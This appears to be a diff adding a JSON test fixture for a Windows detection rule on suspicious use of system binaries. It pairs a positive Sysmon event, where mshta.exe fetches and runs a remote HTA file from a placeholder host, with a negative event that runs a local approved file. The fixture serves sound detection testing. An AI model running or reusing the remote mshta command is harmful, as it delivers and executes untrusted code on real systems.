@@ -1,0 +1,21 @@
+{
+  "rule_id": "fusion-windows-suspicious-lolbin",
+  "positive": {
+    "event_id": 1,
+    "platform": "windows",
+    "source_type": "windows_sysmon",
+    "host_name": "WINDOWS-DETECTION-LAB",
+    "process_path": "C:\\Windows\\System32\\mshta.exe",
+    "process_name": "mshta.exe",
+    "command_line": "mshta.exe https://lab.invalid/fusion-test.hta"
+  },
+  "negative": {
+    "event_id": 1,
+    "platform": "windows",
+    "source_type": "windows_sysmon",
+    "host_name": "WINDOWS-DETECTION-LAB",
+    "process_path": "C:\\Windows\\System32\\mshta.exe",
+    "process_name": "mshta.exe",
+    "command_line": "mshta.exe C:\\Lab\\approved-local.hta"
+  }
+}
